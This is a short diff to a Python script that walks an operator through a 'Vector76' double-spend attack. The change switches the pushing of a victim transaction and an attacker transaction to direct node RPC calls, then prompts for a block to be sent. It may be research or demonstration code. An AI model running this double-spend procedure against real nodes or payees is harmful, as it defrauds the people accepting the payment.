@@ -230,9 +230,9 @@ input(" --- Press the enter key to continue the Vector76 attack... --- ")
 print()
 
 print("push V1 TX...")
-transaction_util.pushtx(tx_victim) 
+rpc_node.sendrawtransaction(tx_victim)#transaction_util.pushtx(tx_victim) 
 print("push V2 TX...")
-transaction_util.pushtx(tx_attacker) 
+rpc_node.sendrawtransaction(tx_attacker)#transaction_util.pushtx(tx_attacker) 
 print()
 input("--- Send the block after pressing the enter key. --- ")
 print()
@@ -261,5 +261,4 @@ except:
     imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
     subprocess.run(imagine_breaker_cmd)
 
-print(result)
 print("Done.")
